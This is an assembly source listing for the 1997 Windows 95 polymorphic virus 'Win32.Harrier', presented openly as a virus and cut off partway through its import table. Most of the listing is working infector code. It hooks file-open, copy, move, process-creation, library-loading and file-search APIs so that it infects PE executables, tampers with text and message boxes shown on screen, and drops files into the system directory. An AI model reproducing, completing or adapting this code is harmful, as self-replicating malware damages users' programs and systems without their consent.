; Win32.Harrier
;		title	HDL - The pretty PE Polymorphic virus.
;		page	52,130
;
; *==================================================================*
; !  (c) 08-Sep-1997y  by  TechnoRat  "95-th Harrier from DarkLand"  !
; *==================================================================*
;
; Start coding: 27-Jul-1997y                           Ver 2.00a
; Still coding: 04-Sep-1997y                           Ver 2.01a
;  Stop coding: 08-Sep-1997y                           Ver 2.01a
;   Bug fixing: 10-Sep-1997y                           Ver 2.01b
;    Upgrading: 14-Sep-1997y                           Ver 2.01b
;   Bug fixing: 17-Sep-1997y                           Ver 2.01!
;
;
; Win32 Virus.    (c)*TR*SOFT  27-Jul-1997y
;
; Compatible: MS Windows 95 (v4.0+);
;  Structure: many levels polymorphic style;
;   Infector: written as Win32 console application;
;     Infect: all files by type NewExe (PE);
;      Check: attributes, date & time, IO errors, synchronization;
;      Devil: text strings on screen, message boxes, help,
;             Control Panel (System applet);
;       Lock: -=- nothing -=-
;       Code: pretty fucking style;
;
		.386				; Party goes to begin. . .
		.Model	Flat,StdCall
		%NoMacs
		Include	..HarrInc.Inc

; ---------------------------------------------------------
; Data section must be present. Data size must be non-zero.
		.Data
Dumbo		Db	'For fucking TASM32+TLINK32 programs!',0

; ---------------------------------------------------------
		.Code
		Public	StubEntryLabel		; Some definitions
		Public	StubImportPlace		; placed specially
		Public	ImagePlace		; for PELinker
		Public	CurrentPlace
		Public	FixUpsPlace
		Public	FixUpsCounter
		Public	ImportPlace
		Public	ImportLength
		Public	BufferPlace

; ---------------------------------------------------------
MaxPathLen	=	260

; ---------------------------------------------------------
Cr		Equ	<0Dh,0Ah>		; Service macroses
Ver		Equ	<'v2.01 '>
Release		Equ	<'Release (0) from 17-Sep-1997y '>
BasedOn		Equ	<'based on [AsmSwap engine v1.3]'>

; ---------------------------------------------------------
; Stack memory addressing macroses
MemCommitSz	=	38000h			; Stack memory size
TinyMemCommitSz	=	2000h			; WARNING! depends on
						; total program size.

_VarAddr	=	0			; Base of indexing
Var		Macro	VarName,VarType
&VarName	CatStr	<[>,%_VarAddr,<][EBp]>	; Defining the new
		If	Type VarType Eq 0	; variable reference
_VarAddr	=	_VarAddr+VarType
		Else
_VarAddr	=	_VarAddr+Type VarType
		EndIf
		EndM	Var

; ---------------------------------------------------------
; Binary include support
BFile		Macro	ILabel,IFileName,IFileSize
&ILabel		Label	Byte
_BFileStart	=	$
		Irpc	Char,IFileName
		Db	'&Char'
		EndM
		Db	(IFileSize-($-_BFileStart)) Dup(90h)
		EndM	BFile

; ---------------------------------------------------------
DebugModeKey	=	0h			; defining the Debug
		Irpc	Char,<CREATOR=TechnoRat> ; Mode switcher key
DebugModeKey	=	((DebugModeKey Xor '&Char')-1) Shl 1
		EndM

; ---------------------------------------------------------
_Jmp		Macro	Addr			; Macroses that supports
		Jmp	Addr			; AsmSwap scrambling
		EndM	_Jmp

_Nop		Macro	Addr
		EndM	_Nop

; ---------------------------------------------------------
; Here the start of running code.
Start:						; Here can be placed
						; the polymorphic decryptor,
						; And will be placed!
						; But later.
;StartCode
;Separator=_Jmp
; ---------------------------------------------------------
;Here the real virus body.

BodyHere:	PushA
		Cld				; Need after decrypting!
FirstCm:	Call	SecondCm
		Xor	EAx,EAx			; Some trash
		Ret				; will never work!!!

SecondCm:	Xor	EAx,EAx			; Some another trash
		Pop	EBx			; Real body. . .
		Sub	EBx,(Offset FirstCm - Offset Start + 5)
		Xor	EAx,EAx			; Wait on semaphore
WaitInit:	Xchg	EAx,[EBx][Offset InitOk - Offset Start]
		Or	EAx,EAx
		Jz	WaitInit
		Cmp	EAx,2h			; Ok, All done.
		Je	DoneInit
;DefCodeLine
		Db	0BEh
FixUpsPlace	Dd	?			; Mov ESi,xxxx
;BreakCodeLine
;DefCodeLine
		Db	0B9h
FixUpsCounter	Dd	?			; Mov ECx,xxxx
;BreakCodeLine
Again:		Mov	EDi,[EBx+ESi]
		Add	[EBx+EDi],EBx		; SetUp ReloItems
		Add	ESi,4h
		Dec	ECx
		Jnz	Again
		Mov	Here,EBx

		Mov	EAx,StubEntryLabel	; Calculate the
		Add	EAx,EBx			; Host entry point
		Sub	EAx,CurrentPlace	; and place it for future
		Sub	EAx,PolyMorphSz
		Mov	HostIP,EAx
		Sub	EBx,CurrentPlace
		Sub	EBx,PolyMorphSz
		Mov	MemBase,EBx

		Mov	Debug,0h		; Checking for debug
		Call	GetEnvironmentStringsA	; mode presence. . .
New_Key:	Xor	EBx,EBx
New_Char:	Cmp	Byte Ptr [EAx],0h	; Calculate hash from
		Je	Check_Key		; Env. string
		Xor	Bl,[EAx]
		Dec	EBx
		Shl	EBx,1
		Inc	EAx
		Jmp	New_Char
Check_Key:	Cmp	EBx,DebugModeKey	; Debug key detected?
		Jne	New_String
		Or	Debug,-1		; Yes!
		Push	0h			; (??? Not used)
		Call	MessageBeep
		Push	40h			; OkOnly+Information
		Push	Offset InfSelfHeader
		Push	Offset InfEnterDebug
		Push	0h
		Call	MessageBoxA
		Jmp	Break_Keys
New_String:	Inc	EAx			; No, next string
		Cmp	Byte Ptr [EAx],0h
		Jne	New_Key
Break_Keys:
		Mov	EAx,Offset KernelName	; SetUp import entries
		Mov	EDx,Offset KrnlImp	; on Kernel32 And Shell32
		Mov	ECx,KrnlImpCnt		; And ComDlg32 DLLs
		Call	SetUpImport
		Mov	EAx,Offset ShellName
		Mov	EDx,Offset ShellImp
		Mov	ECx,ShellImpCnt
		Call	SetUpImport
		Mov	EAx,Offset DialogName
		Mov	EDx,Offset DialogImp
		Mov	ECx,DialogImpCnt
		Call	SetUpImport
		Mov	EAx,Offset UserName	; and User32 and GDI32 DLLs
		Mov	EDx,Offset UserImp
		Mov	ECx,UserImpCnt
		Call	SetUpImport
		Mov	EAx,Offset GDIName
		Mov	EDx,Offset GDIImp
		Mov	ECx,GDIImpCnt
		Call	SetUpImport
		Mov	HelpCounter,0h
		Mov	wsRet$,0h		; Critical section end.

DoneInit:	Mov	InitOk,2h		; No Writes in RAM here!!!
; Here can be implemented some initialization features.
; for Example: infecting the Export in SHELL32.dll or
; in COMDLG32.dll; or infecting the Explorer.Exe or . . .

		Push	MemCommitSz/4h
		Call	AllocStackMem
		Lea	EAx,FT_Struc
		Push	EAx
		Call	GetSystemTime		; Get "Random" value
		Cmp	Word Ptr FT_Second,10h
		Jne	Go_Away
		Push	1000h			; OkOnly+SystemModal
		Push	Offset InfSelfHeader
		Push	Offset HelloMsg
		Push	0h
		Call	MessageBoxA		; Fuck the society ;-)

Go_Away:	Lea	EAx,PackedTime		; Initialize random generator
		Push	EAx			; Can be performed at
		Lea	EAx,FT_Struc		; any time, it is legal!!!
		Push	EAx
		Call	SystemTimeToFileTime
		Mov	EAx,PackedTime
		Or	EAx,1h
		Mov	RandSeed,EAx

		Mov	EAx,10h			; by 1/16 probability
		Call	Random
		Or	EAx,EAx
		Jnz	NoInstallOEM

		Push	MaxPathLen
		Lea	EAx,SomePath		; Some nice install ;-)
		Push	EAx			; (about the OEM)
		Call	GetSystemDirectoryA
		Push	EAx
		Lea	EAx,SomePath
		Add	EAx,[ESp]
		Mov	EDi,EAx			; The pretty LOGO file
		Mov	ESi,Offset BitMapName
		Cld
		Mov	ECx,BitMapNameL
		Rep	MovsB

		Push	0h
		Push	10000000h+80h		; FAN, FFRA
		Push	2h			; CA
		Push	0h
		Push	1h
		Push	80000000h+40000000h	; GR/GW
		Lea	EAx,SomePath
		Push	EAx
		Call	CreateFileA
		Cmp	EAx,-1h			; Create error!
		Je	Fail_OEM
		Push	EAx
		Push	0h
		Lea	ECx,ProcessedBytes
		Push	ECx
		Push	HarrBtMpFile_Sz
		Push	Offset BitMapFile
		Push	EAx
		Call	WriteFile
		Call	CloseHandle

		Lea	EAx,SomePath
		Add	EAx,[ESp]
		Mov	EDi,EAx			; The pretty INFO file
		Mov	ESi,Offset InfoName
		Mov	ECx,InfoNameL
		Rep	MovsB

		Push	0h
		Push	10000000h+80h		; FAN, FFRA
		Push	2h			; CA
		Push	0h
		Push	1h
		Push	80000000h+40000000h	; GR/GW
		Lea	EAx,SomePath
		Push	EAx
		Call	CreateFileA
		Cmp	EAx,-1h			; Create error!
		Je	Fail_OEM
		Push	EAx
		Push	0h
		Lea	ECx,ProcessedBytes
		Push	ECx
		Push	HarrInfoFile_Sz
		Push	Offset InfoFile
		Push	EAx
		Call	WriteFile
		Call	CloseHandle

Fail_OEM:	Pop	EAx

NoInstallOEM:	Push	MemCommitSz/4h
		Call	FreeStackMem
		PopA
		Jmp	HostIP			; All Done.

; ---------------------------------------------------------
SetUpImport:	Mov	EBx,StubImportPlace	; SetUp HostImport
		Add	EBx,Here
Set_3$:		Cmp	DWord Ptr [EBx][3*4],0h	; (EDx/ECx, EAx)
		Je	Set_0$			; Corrupt all. . .
		Mov	ESi,[EBx][3*4]		; Scan stub modules
		Add	ESi,MemBase
		Mov	EDi,EAx
		Cld
Set_2$:		Call	CmpUnCase		; Compare two module chars
		Jne	Set_1$
		Cmp	Byte Ptr [EDi][-1],0h
		Jne	Set_2$			; Names compared Ok.
		Call	Set_Mdl$		; SetUp current module.
Set_1$:		Add	EBx,5*4			; Next module. . .
		Jmp	Set_3$
Set_0$:		Ret				; Last module, All done.

Set_Mdl$:	Push	EAx
		Mov	ESi,[EBx]		; (Current Module in EBx)
		Or	ESi,ESi			; LookUp present?
		Jz	Set_Mdl_1$
		Add	ESi,MemBase
		Xor	EAx,EAx
Set_Mdl_0$:	Cmp	DWord Ptr [ESi],0h	; Last LookUp?
		Je	Set_Mdl_1$
		Test	DWord Ptr [ESi],80000000h
		Jne	Set_Mdl_2$		; Ordinal?
		Push	ESi
		Mov	ESi,[ESi]		; Get Name in module
		Add	ESi,MemBase
		Add	ESi,2h
		Push	EDx
		Push	ECx
Set_Mdl_M0$:	Push	ESi
		Mov	EDi,[EDx][1*4]		; Get self Name to SetUp
Set_Mdl_M2$:	Call	CmpUnCase
		Jne	Set_Mdl_M1$
		Cmp	Byte Ptr [EDi][-1],0h
		Jne	Set_Mdl_M2$		; Ok, SetUp this entry
		Mov	EDi,[EBx][4*4]		; Ptr to AddrTable
		Add	EDi,MemBase
		Mov	ESi,[EDi][EAx]		; ImportValue
		Push	EDi
		Mov	EDi,[EDx]		; SetUp _Var
		Mov	[EDi],ESi
		Pop	EDi
		Mov	ESi,[EDx][2*4]		; SetUp ImportValue
		Mov	[EDi][EAx],ESi		; by IProc
		Pop	ESi
		Jmp	Set_Mdl_M3$
Set_Mdl_M1$:	Pop	ESi
		Add	EDx,3*4			; Next name in list
		Dec	ECx
		Jnz	Set_Mdl_M0$
Set_Mdl_M3$:	Pop	ECx
		Pop	EDx
		Pop	ESi
Set_Mdl_2$:	Add	ESi,4			; Next name in module
		Add	EAx,4
		Jmp	Set_Mdl_0$
Set_Mdl_1$:	Pop	EAx
		Ret

CmpUnCase:	Push	EAx			; CmpsB (with UnCase check)
		LodsB
		Call	UpCase
		Mov	Ah,Al
		Xchg	ESi,EDi
		LodsB
		Call	UpCase
		Xchg	ESi,EDi
		Cmp	Ah,Al
		Pop	EAx
		Ret

UpCase:		Cmp	Al,'a'			; UpCase the Al register
		Jb	UpCase_0$
		Cmp	Al,'z'
		Ja	UpCase_0$
		Sub	Al,20h
UpCase_0$:	Ret

; ---------------------------------------------------------
; KERNEL32 infected functions realization.
ICreateFileA:	Push	EBp			; CreateFileA
		Mov	EBp,ESp			; opens or creates
		PushA				; the file or other
		Mov	EDx,[EBp][8]		; resource (pipe, device, etc)
		Mov	EBx,Offset NCreateFileA
		Call	InfectByName
		PopA
		Pop	EBp
		Jmp	_CreateFileA

IOpenFile:	Push	EBp			; OpenFile
		Mov	EBp,ESp			; opens or creates
		PushA				; the file
		Mov	EDx,[EBp][8]		; [Obsolete]
		Mov	EBx,Offset NOpenFile
		Call	InfectByName
		PopA
		Pop	EBp
		Jmp	_OpenFile

IMoveFileA:	Push	EBp			; MoveFileA
		Mov	EBp,ESp			; moves or renames
		PushA				; the file
		Mov	EDx,[EBp][8]
		Mov	EBx,Offset NMoveFileA
		Call	InfectByName
		PopA
		Pop	EBp
		Jmp	_MoveFileA

IMoveFileExA:	Push	EBp			; MoveFileExA
		Mov	EBp,ESp			; moves or renames
		PushA				; the file
		Mov	EDx,[EBp][8]		; [Not supported by '95]
		Mov	EBx,Offset NMoveFileExA
		Call	InfectByName
		PopA
		Pop	EBp
		Jmp	_MoveFileExA

ICopyFileA:	Push	EBp			; CopyFileA
		Mov	EBp,ESp			; copyes
		PushA				; the file
		Mov	EDx,[EBp][8]
		Mov	EBx,Offset NCopyFileA
		Call	InfectByName
		PopA
		Pop	EBp
		Jmp	_CopyFileA

I_lopen:	Push	EBp			; _lopen
		Mov	EBp,ESp			; opens
		PushA				; the file
		Mov	EDx,[EBp][8]		; [Obsolete]
		Mov	EBx,Offset N_lopen
		Call	InfectByName
		PopA
		Pop	EBp
		Jmp	__lopen

IWinExec:	Push	EBp			; WinExec
		Mov	EBp,ESp			; spawns
		PushA				; the file
		Mov	EDx,[EBp][8]		; [Obsolete]
		Mov	EBx,Offset NWinExec
		Call	InfectByName
		PopA
		Pop	EBp
		Jmp	_WinExec

ICreateProcessA:
		Push	EBp			; CreateProcessA
		Mov	EBp,ESp			; spawns
		PushA				; the file
		Mov	EDx,[EBp][8]
		Mov	EBx,Offset NCreateProcessA
		Call	InfectByName
		PopA
		Pop	EBp
		Jmp	_CreateProcessA

ILoadLibraryA:	Push	EBp			; LoadLibraryA
		Mov	EBp,ESp			; loads the
		PushA				; library file
		Mov	EDx,[EBp][8]
		Mov	EBx,Offset NLoadLibraryA
		Call	InfectByName
		PopA
		Pop	EBp
		Jmp	_LoadLibraryA

ILoadLibraryExA:
		Push	EBp			; LoadLibraryExA
		Mov	EBp,ESp			; loads the
		PushA				; library file
		Mov	EDx,[EBp][8]
		Mov	EBx,Offset NLoadLibraryExA
		Call	InfectByName
		PopA
		Pop	EBp
		Jmp	_LoadLibraryExA

IFindFirstFileA:
		Push	DWord Ptr [ESp][8]
		Push	DWord Ptr [ESp][8]
		Call	_FindFirstFileA
		Cmp	EAx,-1
		Je	FindFirst_1$
		Push	EBp			; FindFirstFileA
		Mov	EBp,ESp			; searches the
		PushA				; first file
		Mov	EDx,[EBp][0Ch]
		Add	EDx,0Bh*4
		Mov	EBx,Offset NFindFirstFileA
		Call	InfectByName
		PopA
		Pop	EBp
FindFirst_1$:	Ret	8h

IFindNextFileA:
		Push	DWord Ptr [ESp][8]
		Push	DWord Ptr [ESp][8]
		Call	_FindNextFileA
		Or	EAx,EAx
		Je	FindNext_1$
		Push	EBp			; FindNextFileA
		Mov	EBp,ESp			; searches the
		PushA				; next file
		Mov	EDx,[EBp][0Ch]
		Add	EDx,0Bh*4
		Mov	EBx,Offset NFindNextFileA
		Call	InfectByName
		PopA
		Pop	EBp
FindNext_1$:	Ret	8h

; ---------------------------------------------------------
; SHELL32 infected functions realization.
IShellExecuteA:	Push	EBp			; ShellExecuteA
		Mov	EBp,ESp			; opens or prints
		PushA				; the specified file
		Mov	EDx,[EBp][10h]		; via registry
		Mov	EBx,Offset NShellExecuteA
		Call	InfectByName
		PopA
		Pop	EBp
		Jmp	_ShellExecuteA

IShellExecuteEx:
		Push	EBp			; ShellExecuteEx
		Mov	EBp,ESp			; ???
		PushA				;
		Mov	EDx,[EBp][10h]		; [UnDocumented]
		Mov	EBx,Offset NShellExecuteEx
		Call	InfectByName
		PopA
		Pop	EBp
		Jmp	_ShellExecuteEx

IShellExecuteExA:
		Push	EBp			; ShellExecuteExA
		Mov	EBp,ESp			; ???
		PushA				;
		Mov	EDx,[EBp][10h]		; [UnDocumented]
		Mov	EBx,Offset NShellExecuteExA
		Call	InfectByName
		PopA
		Pop	EBp
		Jmp	_ShellExecuteExA

IFindExecutableA:
		Push	EBp			; FindExecutableA
		Mov	EBp,ESp			; searches the
		PushA				; DDE server
		Mov	EDx,[EBp][8]		; via registry
		Mov	EBx,Offset NFindExecutableA
		Call	InfectByName		; or DDE requests
		PopA
		Pop	EBp
		Jmp	_FindExecutableA

; ---------------------------------------------------------
; COMDLG32 infected functions realization.
IGetOpenFileNameA:
		Push	DWord Ptr [ESp][4]	; GetOpenFileNameA
		Call	_GetOpenFileNameA	; returns the name
		Push	EBp			; of opening file
		Mov	EBp,ESp
		PushA
		Mov	EDx,[EBp][8]
		Mov	EDx,[EDx][7*4]
		Mov	EBx,Offset NGetOpenFileNameA
		Call	InfectByName
		PopA
		Pop	EBp
		Ret	4h

IGetSaveFileNameA:
		Push	DWord Ptr [ESp][4]	; GetSaveFileNameA
		Call	_GetSaveFileNameA	; returns the name
		Push	EBp			; of saving file
		Mov	EBp,ESp
		PushA
		Mov	EDx,[EBp][8]
		Mov	EDx,[EDx][7*4]
		Mov	EBx,Offset NGetSaveFileNameA
		Call	InfectByName
		PopA
		Pop	EBp
		Ret	4h

; ---------------------------------------------------------
; USER32 infected functions realization
IDrawTextA:	Push	EBx			; Draw text on screen
		Mov	EBx,ESp
		Push	EAx
		PushA
		Push	TinyMemCommitSz/4h
		Call	AllocStackMem
		Push	DWord Ptr [EBx][5*4+4]
		Push	DWord Ptr [EBx][4*4+4]
		Mov	ECx,[EBx][3*4+4]
		Mov	EDx,[EBx][2*4+4]
		Call	ConvertStr
		Push	ECx
		Push	EDx
		Push	DWord Ptr [EBx][1*4+4]
		Call	_DrawTextA
		Mov	[EBx][-4h],EAx
		Push	TinyMemCommitSz/4h
		Call	FreeStackMem
		PopA
		Pop	EAx
		Pop	EBx
		Ret	5*4

IDrawTextExA:	Push	EBx			; Draw text on screen
		Mov	EBx,ESp
		Push	EAx
		PushA
		Push	TinyMemCommitSz/4h
		Call	AllocStackMem
		Push	DWord Ptr [EBx][6*4+4]
		Push	DWord Ptr [EBx][5*4+4]
		Push	DWord Ptr [EBx][4*4+4]
		Mov	ECx,[EBx][3*4+4]
		Mov	EDx,[EBx][2*4+4]
		Call	ConvertStr
		Push	ECx
		Push	EDx
		Push	DWord Ptr [EBx][1*4+4]
		Call	_DrawTextExA
		Mov	[EBx][-4h],EAx
		Push	TinyMemCommitSz/4h
		Call	FreeStackMem
		PopA
		Pop	EAx
		Pop	EBx
		Ret	6*4

ITabbedTextOutA:
		Push	EBx			; Draw text on screen
		Mov	EBx,ESp
		Push	EAx
		PushA
		Push	TinyMemCommitSz/4h
		Call	AllocStackMem
		Push	DWord Ptr [EBx][8*4+4]
		Push	DWord Ptr [EBx][7*4+4]
		Push	DWord Ptr [EBx][6*4+4]
		Mov	ECx,[EBx][5*4+4]
		Mov	EDx,[EBx][4*4+4]
		Call	ConvertStr
		Push	ECx
		Push	EDx
		Push	DWord Ptr [EBx][3*4+4]
		Push	DWord Ptr [EBx][2*4+4]
		Push	DWord Ptr [EBx][1*4+4]
		Call	_TabbedTextOutA
		Mov	[EBx][-4h],EAx
		Push	TinyMemCommitSz/4h
		Call	FreeStackMem
		PopA
		Pop	EAx
		Pop	EBx
		Ret	8*4

IwsprintfA:	Cmp	wsRet$,0h		; Check semaphore!
		Je	wsprintf_1$
		Jmp	_wsprintfA

wsprintf_1$:	Pop	wsRet$
		Push	Offset wsprint_0$
		Jmp	_wsprintfA		; Format text string
wsprint_0$:	Push	wsRet$
		Push	EBx
		Mov	EBx,ESp
		Push	EAx
		PushA
		Push	TinyMemCommitSz/4h
		Call	AllocStackMem
		Mov	EDx,[EBx][1*4+4]
		Mov	ECx,[EBx][-4]
		Call	ConvertStr
		Mov	[EBx][-4],ECx
		Mov	ESi,EDx
		Mov	EDi,[EBx][1*4+4]
		Cld
		Call	Transfer_Str
		Push	TinyMemCommitSz/4h
		Call	FreeStackMem
		PopA
		Pop	EAx
		Pop	EBx
		Mov	wsRet$,0h
		Ret
wsRet$		Dd	0h

IwvsprintfA:	Push	EBx			; Format text string
		Mov	EBx,ESp
		Push	EAx
		PushA
		Push	TinyMemCommitSz/4h
		Call	AllocStackMem
		Push	DWord Ptr [EBx][3*4+4]
		Push	DWord Ptr [EBx][2*4+4]
		Push	DWord Ptr [EBx][1*4+4]
		Call	_wvsprintfA
		Mov	EDx,[EBx][1*4+4]
		Mov	ECx,EAx
		Call	ConvertStr
		Mov	[EBx][-4],ECx
		Mov	EDi,[EBx][1*4+4]
		Mov	ESi,EDx
		Cld
		Call	Transfer_Str
		Push	TinyMemCommitSz/4h
		Call	FreeStackMem
		PopA
		Pop	EAx			; function result
		Pop	EBx
		Ret	3*4

IGetTabbedTextExtentA:
		Push	EBx			; Get text parameters
		Mov	EBx,ESp
		Push	EAx
		PushA
		Push	TinyMemCommitSz/4h
		Call	AllocStackMem
		Push	DWord Ptr [EBx][5*4+4]
		Push	DWord Ptr [EBx][4*4+4]
		Mov	ECx,[EBx][3*4+4]
		Mov	EDx,[EBx][2*4+4]
		Call	ConvertStr
		Push	ECx
		Push	EDx
		Push	DWord Ptr [EBx][1*4+4]
		Call	_GetTabbedTextExtentA
		Mov	[EBx][-4h],EAx
		Push	TinyMemCommitSz/4h
		Call	FreeStackMem
		PopA
		Pop	EAx
		Pop	EBx
		Ret	5*4

IMessageBoxA:	Push	EBx			; Shows the some message
		Mov	EBx,ESp
		Push	EAx
		PushA
		Push	MemCommitSz/4h
		Call	AllocStackMem
		Lea	EAx,FT_Struc
		Push	EAx
		Call	GetSystemTime		; Get "Random" value
		Cmp	Word Ptr FT_Second,10h
		Jae	Message_None$
		MovZx	EAx,Word Ptr FT_Milliseconds
		Shr	EAx,1
		Xor	EDx,EDx
		Mov	ECx,FuckMsgCounter
		Div	ECx
		Shl	EDx,1
		Shl	EDx,1
		Add	EDx,Offset FuckMessages
		Mov	EDx,[EDx]
		Push	DWord Ptr [EBx][4*4+4]
		Push	DWord Ptr [EBx][3*4+4]
		Push	EDx
		Push	DWord Ptr [EBx][1*4+4]
		Call	MessageBoxA
		Mov	[EBx][-4h],EAx
		Push	MemCommitSz/4h
		Call	FreeStackMem
		PopA
		Pop	EAx
		Pop	EBx
		Ret	4*4

Message_None$:	Push	MemCommitSz/4h		; Legal call
		Call	FreeStackMem
		PopA
		Pop	EAx
		Pop	EBx
		Jmp	_MessageBoxA

IWinHelpA:	PushA				; Calls the Windows
		Cmp	HelpCounter,10h		; help system
		Jb	WinHlp_0$
		Push	40h			; OkOnly+Information
		Push	Offset InfSelfHeader
		Push	Offset InfGodHelp
		Push	0h
		Call	MessageBoxA
		PopA
		Xor	EAx,EAx
		Ret	4*4

WinHlp_0$:	Inc	HelpCounter		; Legal call
		PopA
		Jmp	_WinHelpA

; ---------------------------------------------------------
; GDI32 infected functions realization
ITextOutA:	Push	EBx			; Draw text on screen
		Mov	EBx,ESp
		Push	EAx
		PushA
		Push	TinyMemCommitSz/4h
		Call	AllocStackMem
		Mov	ECx,[EBx][5*4+4]
		Mov	EDx,[EBx][4*4+4]
		Call	ConvertStr
		Push	ECx
		Push	EDx
		Push	DWord Ptr [EBx][3*4+4]
		Push	DWord Ptr [EBx][2*4+4]
		Push	DWord Ptr [EBx][1*4+4]
		Call	_TextOutA
		Mov	[EBx][-4h],EAx
		Push	TinyMemCommitSz/4h
		Call	FreeStackMem
		PopA
		Pop	EAx
		Pop	EBx
		Ret	5*4

IExtTextOutA:	Push	EBx			; Draw text on screen
		Mov	EBx,ESp
		Push	EAx
		PushA
		Push	TinyMemCommitSz/4h
		Call	AllocStackMem
		Push	DWord Ptr [EBx][8*4+4]
		Mov	ECx,[EBx][7*4+4]
		Mov	EDx,[EBx][6*4+4]
		Call	ConvertStr
		Push	ECx
		Push	EDx
		Push	DWord Ptr [EBx][5*4+4]
		Push	DWord Ptr [EBx][4*4+4]
		Push	DWord Ptr [EBx][3*4+4]
		Push	DWord Ptr [EBx][2*4+4]
		Push	DWord Ptr [EBx][1*4+4]
		Call	_ExtTextOutA
		Mov	[EBx][-4h],EAx
		Push	TinyMemCommitSz/4h
		Call	FreeStackMem
		PopA
		Pop	EAx
		Pop	EBx
		Ret	8*4

IGetTextExtentPointA:
		Push	EBx			; Get text parameters
		Mov	EBx,ESp
		Push	EAx
		PushA
		Push	TinyMemCommitSz/4h
		Call	AllocStackMem
		Push	DWord Ptr [EBx][4*4+4]
		Mov	ECx,[EBx][3*4+4]
		Mov	EDx,[EBx][2*4+4]
		Call	ConvertStr
		Push	ECx
		Push	EDx
		Push	DWord Ptr [EBx][1*4+4]
		Call	_GetTextExtentPointA
		Mov	[EBx][-4h],EAx
		Push	TinyMemCommitSz/4h
		Call	FreeStackMem
		PopA
		Pop	EAx
		Pop	EBx
		Ret	4*4

IGetTextExtentPoint32A:
		Push	EBx			; Get text parameters
		Mov	EBx,ESp
		Push	EAx
		PushA
		Push	TinyMemCommitSz/4h
		Call	AllocStackMem
		Push	DWord Ptr [EBx][4*4+4]
		Mov	ECx,[EBx][3*4+4]
		Mov	EDx,[EBx][2*4+4]
		Call	ConvertStr
		Push	ECx
		Push	EDx
		Push	DWord Ptr [EBx][1*4+4]
		Call	_GetTextExtentPoint32A
		Mov	[EBx][-4h],EAx
		Push	TinyMemCommitSz/4h
		Call	FreeStackMem
		PopA
		Pop	EAx
		Pop	EBx
		Ret	4*4

IGetTextExtentExPointA:
		Push	EBx			; Get text parameters
		Mov	EBx,ESp
		Push	EAx
		PushA
		Push	TinyMemCommitSz/4h
		Call	AllocStackMem
		Push	DWord Ptr [EBx][7*4+4]
		Push	DWord Ptr [EBx][6*4+4]
		Push	DWord Ptr [EBx][5*4+4]
		Push	DWord Ptr [EBx][4*4+4]
		Mov	ECx,[EBx][3*4+4]
		Mov	EDx,[EBx][2*4+4]
		Call	ConvertStr
		Push	ECx
		Push	EDx
		Push	DWord Ptr [EBx][1*4+4]
		Call	_GetTextExtentExPointA
		Mov	[EBx][-4h],EAx
		Push	TinyMemCommitSz/4h
		Call	FreeStackMem
		PopA
		Pop	EAx
		Pop	EBx
		Ret	7*4

;Separator=_Nop
; ---------------------------------------------------------
ShellName	Db	'SHELL32.dll',0		; Name of import
KernelName	Db	'KERNEL32.dll',0	; providers
DialogName	Db	'COMDLG32.dll',0

UserName	Db	'USER32.dll',0
GDIName		Db	'GDI32.dll',0

; ---------------------------------------------------------
_CreateFileA	Dd	?			; Thunk pointers
_OpenFile	Dd	?			; (Kernel)
_MoveFileA	Dd	?
_MoveFileExA	Dd	?
_CopyFileA	Dd	?
__lopen		Dd	?
_WinExec	Dd	?
_CreateProcessA	Dd	?
_LoadLibraryA	Dd	?
_LoadLibraryExA	Dd	?
_FindFirstFileA	Dd	?
_FindNextFileA	Dd	?

_ShellExecuteA	Dd	?			; (Shell)
_ShellExecuteEx	Dd	?
_ShellExecuteExA Dd	?
_FindExecutableA Dd	?

_GetOpenFileNameA Dd	?			; (CommDlg)
_GetSaveFileNameA Dd	?

_DrawTextA	Dd	?			; (User)
_DrawTextExA	Dd	?
_TabbedTextOutA	Dd	?
_wsprintfA	Dd	?
_wvsprintfA	Dd	?
_GetTabbedTextExtentA Dd ?
_MessageBoxA	Dd	?
_WinHelpA	Dd	?

_TextOutA	Dd	?			; (GDI)
_ExtTextOutA	Dd	?
_GetTextExtentPointA Dd ?
_GetTextExtentPoint32A Dd ?
_GetTextExtentExPointA Dd ?

; ---------------------------------------------------------
NCreateFileA	Db	'CreateFileA',0		; Thunk pointer names
NOpenFile	Db	'OpenFile',0
NMoveFileA	Db	'MoveFileA',0
NMoveFileExA	Db	'MoveFileExA',0
NCopyFileA	Db	'CopyFileA',0
N_lopen		Db	'_lopen',0
NWinExec	Db	'WinExec',0
NCreateProcessA	Db	'CreateProcessA',0
NLoadLibraryA	Db	'LoadLibraryA',0
NLoadLibraryExA	Db	'LoadLibraryExA',0
NFindFirstFileA	Db	'FindFirstFileA',0
NFindNextFileA	Db	'FindNextFileA',0

NShellExecuteA	Db	'ShellExecuteA',0
NShellExecuteEx	Db	'ShellExecuteEx',0
NShellExecuteExA Db	'ShellExecuteExA',0
NFindExecutableA Db	'FindExecutable',0

NGetOpenFileNameA Db	'GetOpenFileNameA',0
NGetSaveFileNameA Db	'GetSaveFileNameA',0

NDrawTextA	Db	'DrawTextA',0
NDrawTextExA	Db	'DrawTextExA',0
NTabbedTextOutA	Db	'TabbedTextOutA',0
NwsprintfA	Db	'wsprintfA',0
NwvsprintfA	Db	'wvsprintfA',0
NGetTabbedTextExtentA Db 'GetTabbedTextExtentA',0
NMessageBoxA	Db	'MessageBoxA',0
NWinHelpA	Db	'WinHelpA',0

NTextOutA	Db	'TextOutA',0
NExtTextOutA	Db	'ExtTextOutA',0
NGetTextExtentPointA Db 'GetTextExtentPointA',0
NGetTextExtentPoint32A Db 'GetTextExtentPoint32A',0
NGetTextExtentExPointA Db 'GetTextExtentExPointA',0

; ---------------------------------------------------------
;DefCodeLine
KrnlImp		Label	DWord
		Dd	Offset _CreateFileA
		Dd	Offset NCreateFileA
		Dd	Offset ICreateFileA

		Dd	Offset _OpenFile
		Dd	Offset NOpenFile
		Dd	Offset IOpenFile

		Dd	Offset _MoveFileA
		Dd	Offset NMoveFileA
		Dd	Offset IMoveFIleA

		Dd	Offset _MoveFileExA
		Dd	Offset NMoveFileExA
		Dd	Offset IMoveFileExA

		Dd	Offset _CopyFileA
		Dd	Offset NCopyFileA
		Dd	Offset ICopyFileA

		Dd	Offset __lopen
		Dd	Offset N_lopen
		Dd	Offset I_lopen

		Dd	Offset _WinExec
		Dd	Offset NWinExec
		Dd	Offset IWinExec

		Dd	Offset _CreateProcessA
		Dd	Offset NCreateProcessA
		Dd	Offset ICreateProcessA

		Dd	Offset _LoadLibraryA
		Dd	Offset NLoadLibraryA
		Dd	Offset ILoadLibraryA

		Dd	Offset _LoadLibraryExA
		Dd	Offset NLoadLibraryExA
		Dd	Offset ILoadLibraryExA

		Dd	Offset _FindFirstFileA
